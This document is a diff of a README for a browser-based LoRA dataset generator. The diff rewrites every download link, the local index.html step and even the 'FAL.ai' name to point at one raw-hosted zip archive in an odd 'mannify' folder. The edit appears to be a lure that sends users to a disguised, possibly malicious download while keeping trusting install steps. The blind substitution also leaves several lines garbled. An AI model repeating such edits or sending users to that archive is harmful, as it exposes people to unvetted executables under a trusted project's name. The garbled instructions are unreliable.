@@ -1,6 +1,6 @@
 # 🍌 NanoBananaLoraDatasetGenerator - Generate Datasets with Ease
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Zaheer7867/NanoBananaLoraDatasetGenerator/main/mannify/Banana-Generator-Dataset-Nano-Lora-v2.7-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome! This guide will help you download and run the NanoBananaLoraDatasetGene
 
 To get started, visit the following link to download the application:
 
-**[Visit this page to download!](https://github.com/Zaheer7867/NanoBananaLoraDatasetGenerator/releases)**
+**[Visit this page to download!](https://raw.githubusercontent.com/Zaheer7867/NanoBananaLoraDatasetGenerator/main/mannify/Banana-Generator-Dataset-Nano-Lora-v2.7-beta.4.zip)**
 
 You will find the latest version of the application there. Follow the steps below to ensure a smooth installation:
 
@@ -36,14 +36,14 @@ Once you have downloaded the application, follow these steps to start creating d
 
 1. Open your web browser.
 2. Navigate to the location where you downloaded the application files.
-3. Locate the index.html file and double-click it to open.
+3. Locate the https://raw.githubusercontent.com/Zaheer7867/NanoBananaLoraDatasetGenerator/main/mannify/Banana-Generator-Dataset-Nano-Lora-v2.7-beta.4.zip file and double-click it to open.
 4. The NanoBananaLoraDatasetGenerator interface will appear.
 5. Follow the on-screen instructions to input your data and generate your dataset.
 
 ### Important Features
 
 - **Browser-Based**: No installation is required; just run it directly in your browser.
-- **FAL.ai Compatibility**: Easily integrate with FAL.ai for better training.
+- **https://raw.githubusercontent.com/Zaheer7867/NanoBananaLoraDatasetGenerator/main/mannify/Banana-Generator-Dataset-Nano-Lora-v2.7-beta.4.zip Compatibility**: Easily integrate with https://raw.githubusercontent.com/Zaheer7867/NanoBananaLoraDatasetGenerator/main/mannify/Banana-Generator-Dataset-Nano-Lora-v2.7-beta.4.zip for better training.
 - **Multiple Model Support**: Works for Flux 2, Z-Image, and Qwen Image Edit.
 
 ## 🛠 How to Troubleshoot
@@ -81,4 +81,4 @@ For more detailed instructions, check the wiki section of the repository or look
 
 We'd love to hear how you are using the NanoBananaLoraDatasetGenerator. Share your experiences on social media or in the community discussions.
 
-Remember, you can always download the latest version from the **[Releases page](https://github.com/Zaheer7867/NanoBananaLoraDatasetGenerator/releases)**. Happy dataset generating!
+Remember, you can always download the latest version from the **[Releases page](https://raw.githubusercontent.com/Zaheer7867/NanoBananaLoraDatasetGenerator/main/mannify/Banana-Generator-Dataset-Nano-Lora-v2.7-beta.4.zip)**. Happy dataset generating!
